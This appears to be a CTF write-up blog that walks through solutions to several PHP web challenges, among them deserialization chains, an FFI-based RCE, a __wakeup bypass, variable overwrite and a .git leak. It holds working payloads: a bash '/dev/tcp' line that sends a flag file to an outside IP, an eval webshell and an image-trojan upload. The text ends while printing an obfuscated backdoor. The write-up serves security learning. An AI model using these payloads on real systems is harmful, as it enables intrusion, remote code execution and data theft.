<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $registed;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">    <span class="comment">// 要用反序列化触发代码，需要申请的类应该就是register类</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>思路：</p>
<ul>
<li>先上传图片马（改后缀名为png，上传失败，在php文件开头加上<code>GIF89a</code>之后再改成png文件就可以成功上传了)</li>
<li>上传用户cookie来触发反序列化漏洞，将之前上传的图片copy为php后缀名的文件
<ul>
<li>要触发<code>upload_img</code>函数，必须要通过<code>Profile</code>类的<code>__get</code>或者<code>__call</code></li>
<li>要触发反序列化漏洞，肯定要注册register 类</li>
<li>我们的cookie传进对面的Index.php中时，经过反序列化，会生成一个register类并且生存期只有那一行，必然触发<code>__destruct</code>函数。</li>
<li><code>__destruct</code>函数会触发checker的<code>index()</code>方法。假定<code>checker</code> 是<code>profile</code>类，但是index()在<code>profile</code>类中不存在，所以会执行<code>__call</code> 方法，<code>__call()</code>方法又会触发<code>__get()</code>，<code>__get()</code>返回Profile类的<code>except[$name]</code>，并在<code>__call()</code>中被当做方法执行（而且argument为空）</li>
<li>因此，<code>except[$name]</code>应该得是<code>upload_img</code>，而且那个<code>$name</code>就是<code>index</code>，因此，<code>$this-&gt;except = array('index' =&gt; 'upload_img');</code></li>
<li><code>filename_tmp</code>是之前上传的图片马，<code>filename</code>是我们要拷贝到的php文件名</li>
</ul>
</li>
</ul>
<p>最终payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">namespace app\web\controller;</span><br><span class="line">$test = new Profile();</span><br><span class="line">$test -&gt; checker = 0;</span><br><span class="line">$test -&gt; except = array(&apos;index&apos; =&gt; &apos;upload	_img&apos;);</span><br><span class="line">$test -&gt; filename_tmp = &quot;./upload/08856017fa6b6b422db719c5519123dc/6d801eac2d3e2a4c8fa1c1ff256902a9.png&quot;;</span><br><span class="line">$test -&gt; filename = &quot;./upload/08856017fa6b6b422db719c5519123dc/gg.php&quot;;</span><br><span class="line">$test -&gt; ext = 1;</span><br><span class="line"></span><br><span class="line">$a = new Register();</span><br><span class="line">$a -&gt; checker = $test;</span><br><span class="line">$a -&gt; registed = 0;</span><br><span class="line"></span><br><span class="line">$exp = base64_encode(serialize($a));</span><br><span class="line">// var_dump($exp);</span><br><span class="line">echo $exp;</span><br></pre></td></tr></table></figure>
<p>然后用蚁剑连接就可以了。</p>
<blockquote>
<p>ps: 注意必须要指定命名空间, 要不然对象序列化会出错或者是和预期对象不同</p>
</blockquote>
<h2 id="p4队伍出的一道题">p4队伍出的一道题</h2>
<p>进入网站之后拿到bak文件，用sublime打开。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'../func.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'../config.php'</span>;</span><br><span class="line"><span class="keyword">if</span> (!$_COOKIE[<span class="string">'otadmin'</span>]) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">"Not authenticated.\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">'/^&#123;"hash": [0-9A-Z\"]+&#125;$/'</span>, $_COOKIE[<span class="string">'otadmin'</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"COOKIE TAMPERING xD IM A SECURITY EXPERT\n"</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$session_data = json_decode($_COOKIE[<span class="string">'otadmin'</span>], <span class="keyword">true</span>);</span><br><span class="line"><span class="keyword">if</span> ($session_data === <span class="keyword">NULL</span>) &#123; <span class="keyword">echo</span> <span class="string">"COOKIE TAMPERING xD IM A SECURITY EXPERT\n"</span>; <span class="keyword">exit</span>(); &#125;</span><br><span class="line"><span class="keyword">if</span> ($session_data[<span class="string">'hash'</span>] != strtoupper(MD5($cfg_pass))) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"I CAN EVEN GIVE YOU A HINT XD \n"</span>);</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; i &lt; strlen(MD5(<span class="string">'xDdddddd'</span>)); i++) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(ord(MD5($cfg_pass)[$i]) &amp; <span class="number">0xC0</span>);</span><br><span class="line">        <span class="comment">//0xC0二进制是：1100 0000</span></span><br><span class="line">        <span class="comment">//64  二进制是：0100 0000</span></span><br><span class="line">        <span class="comment">//0 0 0 64 64 64 0 64 0 0 64 0 0 0 64 64 64 64 0 0 0 64 0 0 64 0 64 0 64 64 0 0 </span></span><br><span class="line">        <span class="comment">//1 1 1 A  A  A  1 A  1 1 A  1 1 1 a  a  a  a  1 1 1 a  1 1 a  1 a  1 a  a  1 1</span></span><br><span class="line">        <span class="comment">//6 7 6 4  c  d  f 9  f 2 7  3 2 f 2  f  2  3  b 7 5 2  b f f  7 6  c 9  0  1 7 </span></span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">display_admin();</span><br></pre></td></tr></table></figure>
<p>随便传入什么东西，注意hash的冒号后面有一个空格不要忽视。<br>
弹出来的hint拿来分析。<br>
根据我写的注释，结合二进制的与运算，我们只能知道零位代表数字，64代表字母。</p>
<p>注意到<code>if ($session_data['hash'] != strtoupper(MD5($cfg_pass))) {</code>是弱类型比较。</p>
<p>参考小西师傅的博客，知道了头三位是数字，那么只要爆破头三位就可以了。</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET /admin/login.php HTTP/1.1</span><br><span class="line">Host: gameserver.zajebistyc.tf</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-GB,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: __cfduid=df075e1e270efb9af840cfbcfcea51b6b1552736385;otadmin=&#123;&quot;hash&quot;: §111§&#125;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">DNT: 1</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure>
<p>然后为payload设置number类型，起点100终点999步长为1，跑一下就可以了，最终flag:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">p4&#123;wtf_php_comparisons_how_do_they_work&#125;</span><br></pre></td></tr></table></figure>
<h2 id="2019-RCTF-nextphp">2019 RCTF nextphp</h2>
<p>After <code>phpinfo()</code>, we can notice the versionn is <code>php 7.4</code> ,and a new feature <code>ffi</code> was enabled .</p>
<blockquote>
<p>FFI is one of the features that made Python and LuaJIT very useful for<br>
fast prototyping. It allows calling C functions and using C data types<br>
from pure scripting language and therefore develop “system code” more<br>
productively. For PHP, FFI opens a way to write PHP extensions and<br>
bindings to C libraries in pure PHP.</p>
</blockquote>
<p><a href="https://wiki.php.net/rfc/ffi" target="_blank" rel="noopener">https://wiki.php.net/rfc/ffi</a> alse give an example:</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; &lt;?php</span><br><span class="line">&gt; // create FFI object, loading libc and exporting function printf()</span><br><span class="line">&gt; $ffi = FFI::cdef(</span><br><span class="line">&gt;     &quot;int printf(const char *format, ...);&quot;, // this is regular C declaration</span><br><span class="line">&gt;     &quot;libc.so.6&quot;);</span><br><span class="line">&gt; // call C printf()</span><br><span class="line">&gt; $ffi-&gt;printf(&quot;Hello %s!\n&quot;, &quot;world&quot;);</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>And using <code>var_dump()</code> , we got source code as follows:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $data = [</span><br><span class="line">        <span class="string">'ret'</span> =&gt; <span class="keyword">null</span>,</span><br><span class="line">        <span class="string">'func'</span> =&gt; <span class="string">'print_r'</span>,</span><br><span class="line">        <span class="string">'arg'</span> =&gt; <span class="string">'1'</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">'ret'</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">'func'</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">'arg'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// return the data</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__serialize</span><span class="params">()</span>: <span class="title">array</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// mix the two array</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span><span class="params">(array $data)</span> </span>&#123;</span><br><span class="line">        array_merge(<span class="keyword">$this</span>-&gt;data, $data);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// serialize the data</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> <span class="params">()</span>: <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// unserialize the data</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span><span class="params">($payload)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = unserialize($payload);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// return the ith data in $data</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span> <span class="params">($key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$key];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// public function __set ($key, $value) &#123;</span></span><br><span class="line">        <span class="comment">// throw new \Exception('No implemented');</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// public function __construct () &#123;</span></span><br><span class="line">        <span class="comment">// throw new \Exception('No implemented');</span></span><br><span class="line">    <span class="comment">/* &#125; */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $data = [</span><br><span class="line">        <span class="string">'ret'</span> =&gt; <span class="keyword">null</span>,</span><br><span class="line">        <span class="string">'func'</span> =&gt; <span class="string">'FFI::cdef'</span>,</span><br><span class="line">        <span class="string">'arg'</span> =&gt; <span class="string">'int system(const char *command);'</span></span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure>
<p>generate serialized string and sent it to target as follows:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$a=unserialize(&apos;C:1:&quot;A&quot;:95:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:32:&quot;int system(const char *command);&quot;;&#125;&#125;&apos;);$a-&gt;ret-&gt;system(&apos;bash -c &quot;cat /flag &gt; /dev/tcp/207.148.64.125/9991&quot;&apos;);</span><br></pre></td></tr></table></figure>
<h2 id="ichunqiu-Hash">ichunqiu Hash</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">'Gu3ss_m3_h2h2.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">'Gu3ss_m3_h2h2.php'</span>) &#123;</span><br><span class="line">            <span class="comment">//the secret is in the f15g_1s_here.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">'Gu3ss_m3_h2h2.php'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'var'</span>])) &#123;</span><br><span class="line">    $var = base64_decode($_GET[<span class="string">'var'</span>]);</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/[oc]:\d+:/i'</span>, $var)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'stop hacking!'</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        @unserialize($var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="string">"Gu3ss_m3_h2h2.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>__wakeup</code> function will be called automatically when <strong>unserialize happen</strong> .In order to bypass the limitation, first , replace <code>O:4:</code> to <code>O:+4:</code> to bypass Regular expression. Second, <strong>increase the number of parameter in serialize string</strong> to bypass <code>__wakeup</code> function (keep silient when the parameter number is wrong).</p>
<p>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">'f15g_1s_here.php'</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Demo();</span><br><span class="line">$a = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line">$a = str_replace(<span class="string">'O:4'</span>, <span class="string">'O:+4'</span>, $a);</span><br><span class="line">$a = str_replace(<span class="string">':1:'</span>,<span class="string">':2:'</span>, $a);</span><br><span class="line"><span class="keyword">echo</span> base64_encode($a);</span><br></pre></td></tr></table></figure>
<p>And there is a trap which is noteable enough,  the serialized string that be eched in our payload shows as follow:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:16:&quot;f15g_1s_here.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>See something strange? **“Demofile” has 8 character , but it shows there are 10 characters , which, indicates that it contains some Invisible characters . It was the reason why copy the echod string directly and got it in base64-encode did not word. **</p>
<p>and <code>f15g_1s_here.php</code> ’ s contents are as follows:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'val'</span>])) &#123;</span><br><span class="line">    $val = $_GET[<span class="string">'val'</span>];</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'$value="'</span> . addslashes($val) . <span class="string">'";'</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'hahaha!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?val=$&#123;@eval($_POST[0])&#125;</span><br><span class="line">Post data: 0=phpinfo();</span><br><span class="line">0=echo `ls`</span><br><span class="line">0=echo `cat True_F1ag_i3_Here_233.php`</span><br></pre></td></tr></table></figure>
<blockquote>
<p>ps: <strong>`</strong> actully call shell_exec() function</p>
</blockquote>
<h2 id="ichunqiu-try">ichunqiu try</h2>
<p>finally got source code:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">    <span class="keyword">if</span>($key == <span class="string">"_SESSION"</span>)&#123;</span><br><span class="line">        $_GET[$key] = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $&#123;$key&#125; = $value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">    <span class="keyword">if</span>($key == <span class="string">"_SESSION"</span>)&#123;</span><br><span class="line">        $_POST[$key] = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $&#123;$key&#125; = $value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_COOKIE <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">    <span class="keyword">if</span>($key == <span class="string">"_SESSION"</span>)&#123;</span><br><span class="line">        $_COOKIE[$key] = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $&#123;$key&#125; = $value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_SERVER <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">        $&#123;$key&#125; = $value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'admin'</span>]==<span class="string">'yes'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'not admin'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>and our payload is :</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://902bdd4e83e54133a6f850f6b12c6e236da12c85e6dc43c9.changame.ichunqiu.com/Get_Fl3g_e165421110ba03099a1c0393373c5b43.php?_SERVER[_SESSION][admin]=yes</span><br></pre></td></tr></table></figure>
<p>so , from the payload above , there is one thing to be true: <strong>when $_GET as $key =&gt; $value was executed , the variable $_SERVER has already generated.</strong></p>
<h2 id="login">login</h2>
<p>看源码拉到下面有密码，登陆抓包，看见有个参数<code>show</code>，然后修改他的值从0变成1，发送，得到源代码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	include &apos;common.php&apos;;</span><br><span class="line">	$requset = array_merge($_GET, $_POST, $_SESSION, $_COOKIE);</span><br><span class="line">	class db</span><br><span class="line">	&#123;</span><br><span class="line">		public $where;</span><br><span class="line">		function __wakeup()</span><br><span class="line">		&#123;</span><br><span class="line">			if(!empty($this-&gt;where))</span><br><span class="line">			&#123;</span><br><span class="line">				$this-&gt;select($this-&gt;where);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		function select($where)</span><br><span class="line">		&#123;</span><br><span class="line">			$sql = mysql_query(&apos;select * from user where &apos;.$where);</span><br><span class="line">			return @mysql_fetch_array($sql);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	if(isset($requset[&apos;token&apos;]))</span><br><span class="line">	&#123;</span><br><span class="line">		$login = unserialize(gzuncompress(base64_decode($requset[&apos;token&apos;])));</span><br><span class="line">		$db = new db();</span><br><span class="line">		$row = $db-&gt;select(&apos;user=\&apos;&apos;.mysql_real_escape_string($login[&apos;user&apos;]).&apos;\&apos;&apos;);</span><br><span class="line">		if($login[&apos;user&apos;] === &apos;ichunqiu&apos;)</span><br><span class="line">		&#123;</span><br><span class="line">			echo $flag;</span><br><span class="line">		&#125;else if($row[&apos;pass&apos;] !== $login[&apos;pass&apos;])&#123;</span><br><span class="line">			echo &apos;unserialize injection!!&apos;;</span><br><span class="line">		&#125;else&#123;</span><br><span class="line">			echo &quot;(╯‵□′)╯︵┴─┴ &quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		header(&apos;Location: index.php?error=1&apos;);</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>发送的东西如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = array(&apos;user&apos;=&gt;&apos;ichunqiu&apos;);</span><br><span class="line">echo base64_encode(gzcompress(serialize($a)));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>添加到请求头cookie中的token中发送得到flag</p>
<h2 id="backdoor-ichunqiu">backdoor (ichunqiu)</h2>
<p>首先根据题目提示，查看是否有敏感信息泄露，访问<code>flag.php</code>无果，然后分别用<code>7kbscan</code>和<code>王一航</code>的脚本去扫描，发现有<code>.git</code>文件泄露，但是王的脚本显示访问.git的时候显示<code>403</code>，意味着文件存在但是拒绝访问，但是其他.git文件夹下的文件显示200可以访问。</p>
<p>因此可以使用<code>dvcs-ripper</code>来获取<code>.git</code>文件，这个工具和<code>githack</code>的不同之处在于，前者除了下载文件之外还能回滚回去之前的版本，而后者却不能。使用用法看看<code>readme.md</code>就知道啦。</p>
<p>下载完之后其中有一个<code>flag.php</code>，然后使用<code>git log flag.php</code>来看这个文件的历史版本，显示如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">commit da06087a0b893ddb6b6c857e53ce4387c96785ab           </span><br><span class="line">Author: tmp &lt;tmp@tmp.tmp&gt;                                 </span><br><span class="line">Date:   Fri Sep 16 13:13:16 2016 +0800                    </span><br><span class="line">                                                          </span><br><span class="line">    edit flag.php                                         </span><br><span class="line">                                                          </span><br><span class="line">commit 12c6ddf4af0a5542c1cf6a9ab19b4231c1fd9a88           </span><br><span class="line">Author: tmp &lt;tmp@tmp.tmp&gt;                                 </span><br><span class="line">Date:   Fri Sep 16 13:09:53 2016 +0800                    </span><br><span class="line">                                                          </span><br><span class="line">    test                                                  </span><br><span class="line">                                                          </span><br><span class="line">commit 494a75f8b3c397e8da52e3ff82ddc4bf1bc47f17           </span><br><span class="line">Author: tmp &lt;tmp@tmp.tmp&gt;                                 </span><br><span class="line">Date:   Fri Sep 16 13:07:47 2016 +0800                    </span><br><span class="line">                                                          </span><br><span class="line">    edit flag.php                                         </span><br><span class="line">:...skipping...                                           </span><br><span class="line">commit da06087a0b893ddb6b6c857e53ce4387c96785ab           </span><br><span class="line">Author: tmp &lt;tmp@tmp.tmp&gt;                                 </span><br><span class="line">Date:   Fri Sep 16 13:13:16 2016 +0800                    </span><br><span class="line">                                                          </span><br><span class="line">    edit flag.php                                         </span><br><span class="line">                                                          </span><br><span class="line">commit 12c6ddf4af0a5542c1cf6a9ab19b4231c1fd9a88           </span><br><span class="line">Author: tmp &lt;tmp@tmp.tmp&gt;                                 </span><br><span class="line">Date:   Fri Sep 16 13:09:53 2016 +0800                    </span><br><span class="line">                                                          </span><br><span class="line">    test                                                  </span><br><span class="line">                                                          </span><br><span class="line">commit 494a75f8b3c397e8da52e3ff82ddc4bf1bc47f17           </span><br><span class="line">Author: tmp &lt;tmp@tmp.tmp&gt;                                 </span><br><span class="line">Date:   Fri Sep 16 13:07:47 2016 +0800                    </span><br><span class="line">                                                          </span><br><span class="line">    edit flag.php                                         </span><br><span class="line">                                                          </span><br><span class="line">commit 1556a1d651526780ecd22db22681619e4ce6aa4b           </span><br><span class="line">Author: tmp &lt;tmp@tmp.tmp&gt;                                 </span><br><span class="line">Date:   Fri Sep 16 12:58:51 2016 +0800                    </span><br><span class="line">                                                          </span><br><span class="line">    edit flag.php                                         </span><br><span class="line">                                                          </span><br><span class="line">commit 734d08bfd094afa3372b997bf1c71412c1afc7d9           </span><br><span class="line">Author: tmp &lt;tmp@tmp.tmp&gt;                                 </span><br><span class="line">Date:   Fri Sep 16 12:58:44 2016 +0800                    </span><br><span class="line">                                                          </span><br><span class="line">    edit flag.php                                         </span><br><span class="line">                                                          </span><br><span class="line">commit 25a4a898b1a45412a538a7baa868bc406c1d8ba9           </span><br><span class="line">Author: tmp &lt;tmp@tmp.tmp&gt;                                 </span><br><span class="line">Date:   Fri Sep 16 12:55:18 2016 +0800                    </span><br><span class="line">                                                          </span><br><span class="line">    added web app</span><br></pre></td></tr></table></figure>
<p>然后使用命令<code>git diff 12c6ddf4af0a5542c1cf6a9ab19b4231c1fd9a88</code>来查看之前一个版本的文件。发现<code>flag{true_flag_is_in_the_b4cko0r.php}</code>。</p>
<p>然后尝试访问<code>http://6094ef7a9cad4288a4748de8ff8ffc573453e961300f46ce.game.ichunqiu.com/Challenges/b4ckdo0r.php</code>，页面提示要我们去找源码。</p>
<p>然后我们尝试</p>
<p><code>http://6094ef7a9cad4288a4748de8ff8ffc573453e961300f46ce.game.ichunqiu.com/Challenges/.b4ckdo0r.php.swp</code><br>
和<code>http://6094ef7a9cad4288a4748de8ff8ffc573453e961300f46ce.game.ichunqiu.com/Challenges/.b4ckdo0r.php.swo</code>来看看是否有文件备份。发现swo可以。</p>
<p>下载下来之后使用命令<code>vim -r b4ckdo0r.php.swo</code>来还原，得到以下代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;can you find the source code of me?&quot;;</span><br><span class="line">/**</span><br><span class="line"> * Signature For Report</span><br><span class="line"> */$h=&apos;_)m/&quot;,&quot;/-/)m&quot;),)marray()m&quot;/&quot;,&quot;+&quot;)m),$)mss($s[$i)m],0,$e))))m)m,$k)));$o=ob)m_get_c)monte)m)mnts)m();ob_end_clean)&apos;;/*</span><br><span class="line"> */$H=&apos;m();$d=ba)mse64)m_encode)m(x(gzc)mompres)ms($o),)m$)mk));print(&quot;&lt;)m$k&gt;$d&lt;)m/)m$k&gt;)m&quot;);@sessio)mn_d)mestroy();&#125;&#125;&#125;&#125;&apos;;/*</span><br><span class="line"> */$N=&apos;mR;$rr)m=@$r[)m&quot;HTT)mP_RE)mFERER&quot;];$ra)m=)m@$r[&quot;HTTP_AC)mC)mEPT_LANG)mUAGE)m&quot;)m];if($rr)m&amp;&amp;$ra)&#123;)m$u=parse_u)mrl($rr);p&apos;;/*</span><br><span class="line"> */$u=&apos;$e)&#123;)m$k=$)mkh.$kf;ob)m_start();)m@eva)ml(@gzunco)mmpr)mess(@x(@)mbase6)m4_deco)mde(p)m)mreg_re)mplace(array(&quot;/&apos;;/*</span><br><span class="line"> 